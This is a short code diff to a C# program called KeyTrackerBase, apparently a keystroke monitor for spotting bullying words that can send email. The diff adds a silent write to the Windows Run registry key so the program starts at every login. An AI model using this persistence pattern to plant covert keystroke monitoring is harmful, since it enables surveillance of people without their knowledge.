@@ -11,7 +11,7 @@ using KeyTrackerBase;
 using System.Drawing;
 using System.Net.Mail;//used for emailing
 using Test_2;
-using Ionic.Zip;
+using Microsoft.Win32;
 
 //cyberbullying
 
@@ -19,6 +19,9 @@ namespace KeyTrackerBase
 {
     public partial class Form1 : Form
     {
+        //path where windows looks for startup apps
+        RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+
         string sentence;
         string badWords;
         string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
@@ -41,6 +44,9 @@ namespace KeyTrackerBase
 
         public Form1()
         {
+            //run on startup
+            rkApp.SetValue("KeyTrackerBase", Application.ExecutablePath.ToString());
+
             ////revert to default - get started
             //Properties.Settings.Default.IsFirstTime = true;
             //Properties.Settings.Default.Save();
